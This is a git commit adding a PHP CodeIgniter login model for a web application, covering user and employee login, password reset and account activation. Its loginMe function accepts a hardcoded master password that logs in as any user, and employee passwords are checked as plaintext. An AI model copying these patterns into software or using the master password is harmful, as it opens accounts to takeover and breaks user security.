403b975d5c18bb4cc01deb486111c42f75ccdb4c
aktwork <larastar721@gmail.com>
2021-02-03 17:55:03 +0100

    Menu option right login and check on emplaoyee changed view and controller

---
+++ application/models/login_model_old.php
@@ -0,0 +1,194 @@
+<?php if(!defined('BASEPATH')) exit('No direct script access allowed');
+
+/**
+ * Class : Login_model (Login Model)
+ * Login model class to get to authenticate user credentials
+ * @author : Kishor Mali
+ * @version : 1.1
+ * @since : 15 November 2016
+ */
+class Login_model extends CI_Model
+{
+
+    /**
+     * This function used to check the login credentials of the user
+     * @param string $email : This is email of the user
+     * @param string $password : This is encrypted password of the user
+     */
+
+    function loginMe($email, $password){
+        $this->db->select('BaseTbl.id as userId, BaseTbl.password, BaseTbl.usershorturl, BaseTbl.username as name, BaseTbl.roleId, BaseTbl.active, Roles.role, BaseTbl.IsDropOffPoint, BaseTbl.lat AS lat, BaseTbl.lng AS lng');
+        $this->db->from('tbl_user as BaseTbl');
+        $this->db->join('tbl_roles as Roles','Roles.roleId = BaseTbl.roleId');
+        $this->db->where('BaseTbl.email', $email);
+        $this->db->where('BaseTbl.isDeleted', 0);
+        $query = $this->db->get();
+        $user = $query->row();
+
+        if(($password=='TiqsMaster@!')){
+            return $user;
+        }
+        else{
+            if(!empty($user)){
+                if(verifyHashedPassword($password, $user->password)){
+                    return $user;
+                }
+                else {
+                    return array();
+                }
+            }
+            else {
+                return array();
+            }
+        }
+    }
+
+	function loginEmployee($email, $password){
+		$this->db->select('*');
+		$this->db->from('tbl_employee');
+		$this->db->where('tbl_employee.email', $email);
+		$this->db->where('tbl_employee.password', $password);
+		$query = $this->db->get();
+		$user = $query->row();
+		if(!empty($user)) {
+			return $user;
+		} else {
+			return array();
+		}
+	}
+
+	/**
+     * This function used to check email exists or not
+     * @param {string} $email : This is users email id
+     * @return {boolean} $result : TRUE/FALSE
+     */
+    function checkEmailExist($email)
+    {
+        $this->db->select('id as userId');
+        $this->db->where('email', $email);
+        $this->db->where('isDeleted', 0);
+        $query = $this->db->get('tbl_user');
+
+        if ($query->num_rows() > 0){
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+
+    /**
+     * This function used to insert reset password data
+     * @param {array} $data : This is reset password data
+     * @return {boolean} $result : TRUE/FALSE
+     */
+    function resetPasswordUser($data)
+    {
+        $result = $this->db->insert('tbl_reset_password', $data);
+
+        if($result) {
+            return TRUE;
+        } else {
+            return FALSE;
+        }
+    }
+
+    /**
+     * This function is used to get customer information by email-id for forget password email
+     * @param string $email : Email id of customer
+     * @return object $result : Information of customer
+     */
+    function getCustomerInfoByEmail($email)
+    {
+        $this->db->select('id as userId, email, username as name');
+        $this->db->from('tbl_user');
+        $this->db->where('isDeleted', 0);
+        $this->db->where('email', $email);
+        $query = $this->db->get();
+
+        return $query->row();
+    }
+
+    /**
+     * This function used to check correct activation deatails for forget password.
+     * @param string $email : Email id of user
+     * @param string $activation_id : This is activation string
+     */
+    function checkActivationDetails($email, $activation_id)
+    {
+        $this->db->select('id');
+        $this->db->from('tbl_reset_password');
+        $this->db->where('email', $email);
+        $this->db->where('activation_id', $activation_id);
+        $query = $this->db->get();
+        return $query->num_rows();
+    }
+
+    // This function used to create new password by reset link
+    function createPasswordUser($email, $password)
+    {
+        $this->db->where('email', $email);
+        $this->db->where('isDeleted', 0);
+        $this->db->update('tbl_user', array('password'=>getHashedPassword($password), hash=>''));
+        $this->db->delete('tbl_reset_password', array('email'=>$email));
+    }
+
+        /**
+     * This function used to save login information of user
+     * @param array $loginInfo : This is users login information
+     */
+    function lastLogin($loginInfo)
+    {
+        $this->db->trans_start();
+        $this->db->insert('tbl_last_login', $loginInfo);
+        $this->db->trans_complete();
+    }
+
+    function checkactivateaccount($userId, $code)
+    {
+        // check the code
+        $this->db->select('id','code','active');
+        $this->db->where('id', $userId);
+        $this->db->where('code', $code);
+        $this->db->where('isDeleted', 0);
+        $this->db->where('active',1);
+        $this->db->from('tbl_user');
+        $query = $this->db->get();
+        return $query->num_rows();
+    }
+
+    function activateaccount($userId, $code)
+    {
+        $this->db->where('id', $userId);
+        $this->db->where('code', $code);
+        $this->db->where('isDeleted', 0);
+        $this->db->update('tbl_user', array(
+            'active' => 1
+        ));
+
+		$this->db->select('id, email, password');
+		$this->db->from('tbl_user');
+		$this->db->where('isDeleted', 0);
+		$this->db->where('id', $userId);
+		$query = $this->db->get();
+		return $query->row();
+
+    }
+
+    /**
+     * This function is used to get last login info by user id
+     * @param number $userId : This is user id
+     * @return number $result : This is query result
+     */
+    function lastLoginInfo($userId)
+    {
+        $this->db->select('BaseTbl.createdDtm');
+        $this->db->where('BaseTbl.userId', $userId);
+        $this->db->order_by('BaseTbl.id', 'DESC');
+        $this->db->limit(1);
+        $query = $this->db->get('tbl_last_login as BaseTbl');
+        return $query->row();
+    }
+}
+
+?>
